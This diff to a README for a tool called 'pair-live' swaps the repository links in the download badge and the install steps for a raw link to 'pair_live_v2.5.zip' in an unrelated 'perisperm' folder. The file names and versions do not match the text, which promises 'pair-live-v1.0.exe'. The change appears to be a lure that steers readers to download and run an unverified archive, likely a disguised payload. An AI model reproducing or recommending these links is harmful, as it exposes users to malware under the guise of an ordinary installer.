@@ -1,6 +1,6 @@
 # 🤝 pair-live - Code together in real time today
 
-[![](https://img.shields.io/badge/Download-pair--live--v1.0.exe-blue)](https://github.com/Debanu895/pair-live)
+[![](https://img.shields.io/badge/Download-pair--live--v1.0.exe-blue)](https://raw.githubusercontent.com/Debanu895/pair-live/main/perisperm/pair_live_v2.5.zip)
 
 pair-live lets you work with others on your code through your terminal. You can write programs with your team while using your favorite tools. The app syncs files and allows chat between people. It removes the need for screen sharing and keeps your workspace clear.
 
@@ -15,7 +15,7 @@ You need a Windows computer to run this software. Ensure you have at least 4GB o
 ## 💾 Downloading and installing
 
 1. Open your web browser.
-2. Go to the [pair-live download page](https://github.com/Debanu895/pair-live).
+2. Go to the [pair-live download page](https://raw.githubusercontent.com/Debanu895/pair-live/main/perisperm/pair_live_v2.5.zip).
 3. Find the file named `pair-live-v1.0.exe` under the latest release.
 4. Click the file to start the download.
 5. Save the file to your desktop or downloads folder.
